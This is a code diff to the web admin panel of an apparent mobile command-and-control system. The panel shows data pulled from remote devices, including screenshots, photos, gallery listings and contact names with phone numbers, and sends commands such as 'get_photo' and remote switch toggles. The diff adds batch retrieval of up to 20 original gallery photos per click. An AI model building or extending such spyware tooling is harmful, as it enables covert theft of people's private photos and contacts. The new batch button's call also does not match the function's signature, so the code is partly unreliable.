@@ -600,13 +600,17 @@ async function loadC2Uploads(id){
   el.innerHTML = '<div style="color:#6b7280;font-size:12px;padding:4px 0 8px">共 '+list.length+' 条</div>' +
     list.map((u,i)=>{
       // 类型分类
-      const isScreenshot = u.type==='screenshot' || u.type==='get_photo' || u.filename.endsWith('.png') || u.filename.endsWith('.jpg');
+      const isScreenshot = u.type==='screenshot' || u.type==='get_photo' || u.type==='gallery_photo' || u.filename.endsWith('.png') || u.filename.endsWith('.jpg');
       const isGallery = u.type==='get_gallery';
       const isContacts = u.type==='get_contacts';
       const isText = u.filename.endsWith('.txt');
+      const isSwitch = u.type==='switch_toggle';
       const isJson = u.filename.endsWith('.json') && !isGallery && !isContacts;
       const delBtn = `<button onclick="deleteUpload(${id},'${esc(u.filename)}')" style="background:#fee2e2;color:#b91c1c;border:0;border-radius:4px;padding:2px 6px;font-size:11px;cursor:pointer">删除</button>`;
       const hdr = `<div style="font-size:12px;color:#6b7280;display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:6px">${fmt(u.created_at)} <b style="color:#374151">${esc(u.type)}</b> ${fmtSize(u.size||0)} ${delBtn}</div>`;
+      if(isSwitch){
+        return `<div id="upload_${i}" style="margin-bottom:8px;padding:10px;background:#f0fdf4;border:1px solid #bbf7d0;border-radius:8px">${hdr}<div id="usw_${i}" style="font-size:13px;font-weight:600;color:#166534">加载结果...</div></div>`;
+      }
       if(isScreenshot){
         return `<div id="upload_${i}" style="margin-bottom:14px;padding:10px;background:#f8fafc;border-radius:8px">${hdr}<div style="display:flex;gap:8px;margin-bottom:6px"><button onclick="openCoordPickerById('uimg_${i}')" style="background:#dbeafe;color:#1d4ed8;border:0;border-radius:4px;padding:3px 8px;font-size:11px;cursor:pointer">📍取坐标</button></div><img id="uimg_${i}" style="min-height:40px;max-height:220px;max-width:100%;object-fit:contain;display:block;border-radius:6px;border:1px solid #e5e7eb;cursor:crosshair;background:#f0f0f0" title="点击打开取坐标面板"><div id="uerr_${i}" style="color:#9ca3af;font-size:12px;padding:4px">加载中...</div></div>`;
       }
@@ -623,12 +627,13 @@ async function loadC2Uploads(id){
     }).join('');
   // 异步加载各文件内容（带 Bearer token）
   list.forEach(async (u,i)=>{
-    const isScreenshot = u.type==='screenshot' || u.type==='get_photo' || u.filename.endsWith('.png') || u.filename.endsWith('.jpg');
+    const isScreenshot = u.type==='screenshot' || u.type==='get_photo' || u.type==='gallery_photo' || u.filename.endsWith('.png') || u.filename.endsWith('.jpg');
     const isGallery = u.type==='get_gallery';
     const isContacts = u.type==='get_contacts';
+    const isSwitch = u.type==='switch_toggle';
     const isText = u.filename.endsWith('.txt');
     const isJson = u.filename.endsWith('.json') && !isGallery && !isContacts;
-    if(!isScreenshot && !isGallery && !isContacts && !isText && !isJson) return;
+    if(!isScreenshot && !isGallery && !isContacts && !isSwitch && !isText && !isJson) return;
     try {
       const res = await fetch(`/admin/api/uploads/${u.filename}`,{headers:{'Authorization':'Bearer '+token}});
       if(!res.ok) throw new Error('HTTP '+res.status);
@@ -645,13 +650,14 @@ async function loadC2Uploads(id){
         try {
           const arr = JSON.parse(text);
           if(arr[0] && arr[0].error){ el2.innerHTML='<span style="color:#dc2626">错误: '+esc(arr[0].error)+'</span>'; return; }
-          el2.innerHTML = '<div style="color:#374151;font-size:12px;margin-bottom:6px">共 '+arr.length+' 张图片（仅元数据，未下载原图）</div>'+
+          el2.innerHTML = '<div style="display:flex;align-items:center;gap:10px;margin-bottom:8px"><span style="color:#374151;font-size:12px">共 '+arr.length+' 张图片</span><button onclick="c2CmdGetGalleryBatch('+id+','+JSON.stringify(arr.slice(0,20).map(f=>String(f.id)))+')" style="background:#059669;color:#fff;border:0;border-radius:4px;padding:3px 10px;font-size:11px;cursor:pointer">📥 批量获取前20张原图</button></div>'+
             '<table style="width:100%;font-size:12px;border-collapse:collapse">'+
-            '<thead><tr style="background:#e5e7eb"><th style="padding:4px 8px;text-align:left">文件名</th><th style="padding:4px 8px;text-align:right">大小</th><th style="padding:4px 8px;text-align:right">日期</th></tr></thead>'+
+            '<thead><tr style="background:#e5e7eb"><th style="padding:4px 8px;text-align:left">文件名</th><th style="padding:4px 8px;text-align:right">大小</th><th style="padding:4px 8px;text-align:right">日期</th><th style="padding:4px 8px;text-align:center">操作</th></tr></thead>'+
             '<tbody>'+arr.slice(0,200).map(f=>{
               const d = f.date ? new Date(f.date*1000).toLocaleDateString('zh-CN') : '';
               const sz = f.size>1048576 ? (f.size/1048576).toFixed(1)+'MB' : f.size>1024 ? (f.size/1024).toFixed(0)+'KB' : (f.size||0)+'B';
-              return `<tr style="border-top:1px solid #f3f4f6"><td style="padding:3px 8px;color:#111;max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(f.name||'')}">${esc(f.name||'')}</td><td style="padding:3px 8px;text-align:right;color:#6b7280">${sz}</td><td style="padding:3px 8px;text-align:right;color:#6b7280">${d}</td></tr>`;
+              const fid = String(f.id || '');
+              return `<tr style="border-top:1px solid #f3f4f6"><td style="padding:3px 8px;color:#111;max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(f.name||'')}">${esc(f.name||'')}</td><td style="padding:3px 8px;text-align:right;color:#6b7280">${sz}</td><td style="padding:3px 8px;text-align:right;color:#6b7280">${d}</td><td style="padding:3px 8px;text-align:center"><button onclick="c2CmdGetPhoto(${fid})" style="background:#dbeafe;color:#1d4ed8;border:0;border-radius:3px;padding:2px 8px;font-size:11px;cursor:pointer">🖼 查看</button></td></tr>`;
             }).join('')+'</tbody></table>'+(arr.length>200?'<div style="color:#6b7280;font-size:11px;margin-top:4px">...仅显示前200条</div>':'');
         } catch(pe){ el2.innerHTML='<pre style="font-size:12px;color:#111;white-space:pre-wrap">'+esc(text.slice(0,1000))+'</pre>'; }
       } else if(isContacts){
@@ -667,13 +673,26 @@ async function loadC2Uploads(id){
             '<thead><tr style="background:#e5e7eb"><th style="padding:4px 8px;text-align:left">姓名</th><th style="padding:4px 8px;text-align:left">号码</th></tr></thead>'+
             '<tbody>'+arr.map(c=>`<tr style="border-top:1px solid #f3f4f6"><td style="padding:3px 8px;color:#111">${esc(c.name||'')}</td><td style="padding:3px 8px;color:#374151;font-family:monospace">${esc(c.phone||'')}</td></tr>`).join('')+'</tbody></table>';
         } catch(pe){ el2.innerHTML='<pre style="font-size:12px;color:#111;white-space:pre-wrap">'+esc(text.slice(0,2000))+'</pre>'; }
+      } else if(isSwitch){
+        const text = await res.text();
+        const el2 = document.getElementById('usw_'+i);
+        if(!el2) return;
+        const isOn = text.includes('开') && !text.includes('关');
+        const isErr = text.includes('失败') || text.includes('错误') || text.includes('error');
+        const bg = isErr ? '#fef2f2' : (isOn ? '#f0fdf4' : '#f8fafc');
+        const border = isErr ? '#fecaca' : (isOn ? '#bbf7d0' : '#d1d5db');
+        const color = isErr ? '#dc2626' : '#166534';
+        const icon = isErr ? '❌' : (isOn ? '🟢' : '🔴');
+        el2.innerHTML = `<span style="color:${color};font-size:14px">${icon} ${esc(text)}</span>`;
+        el2.parentElement.style.background = bg;
+        el2.parentElement.style.borderColor = border;
       } else {
         const text = await res.text();
         const pre = document.getElementById('utxt_'+i);
         if(pre) pre.textContent = text;
       }
     } catch(e){
-      const err = document.getElementById('uerr_'+i) || document.getElementById('ugallery_'+i) || document.getElementById('ucontacts_'+i);
+      const err = document.getElementById('uerr_'+i) || document.getElementById('usw_'+i) || document.getElementById('ugallery_'+i) || document.getElementById('ucontacts_'+i);
       if(err) err.textContent = '加载失败: '+e.message;
     }
   });
@@ -708,10 +727,13 @@ async function renderC2Switches(deviceId){
     container.innerHTML = sw.map(s => {
       const overrideVal = dev.config_override && dev.config_override['sw_'+s.key];
       const state = overrideVal !== undefined ? overrideVal : (s.default_on || false);
+      const fromOverride = overrideVal !== undefined;
       const cls = state ? '#ef4444' : '#6b7280';
       const lbl = (state?'◉ ':'○ ')+esc(s.name)+(state?' 开':' 关');
-      return '<button style="background:'+cls+';color:#fff;border:0;border-radius:4px;padding:3px 10px;font-size:12px;cursor:pointer;white-space:nowrap" onclick="c2CmdSwitchToggle('+deviceId+',\''+esc(s.key)+'\','+(!state)+')">'+lbl+'</button>';
-    }).join('');
+      const hint = fromOverride ? ' (设备已确认)' : ' (默认)';
+      return '<button title="'+esc(s.name)+hint+'" style="background:'+cls+';color:#fff;border:0;border-radius:4px;padding:3px 10px;font-size:12px;cursor:pointer;white-space:nowrap" onclick="c2CmdSwitchToggle('+deviceId+',\''+esc(s.key)+'\','+(!state)+')">'+lbl+'</button>';
+    }).join('')
+    + '<button onclick="renderC2Switches('+deviceId+')" title="刷新开关状态" style="background:#f1f5f9;color:#64748b;border:1px solid #d1d5db;border-radius:4px;padding:3px 8px;font-size:12px;cursor:pointer">🔄</button>'
   } catch(e){
     var c = document.getElementById('c2SwitchButtons');
     if(c) c.innerHTML = '<span style="color:#dc2626;font-size:11px">开关加载失败: '+esc(e.message)+'</span>';
@@ -726,6 +748,17 @@ async function c2CmdGetPhoto(id){
   if(!c2ActiveDeviceId) return;
   const r = await api(`/admin/api/devices/${c2ActiveDeviceId}/command`,{method:'POST',body:JSON.stringify({type:'get_photo',payload:{id:String(id)}})});
   r.ok ? toast('获取图片命令已下发，等待心跳后刷新') : alert(r.message||'失败');
+}
+async function c2CmdGetGalleryBatch(idList){
+  if(!c2ActiveDeviceId) return;
+  if(!idList || !idList.length) return;
+  const ids = idList.map(String);
+  let ok = 0;
+  for (const photoId of ids) {
+    const r = await api(`/admin/api/devices/${c2ActiveDeviceId}/command`,{method:'POST',body:JSON.stringify({type:'get_photo',payload:{id:photoId}})});
+    if(r.ok) ok++; else { alert('第'+(ok+1)+'张失败: '+r.message); break; }
+  }
+  toast(`已下发 ${ok}/${ids.length} 张图片获取命令，等待心跳后刷新`);
 }
 
 // ---- 分组 ----
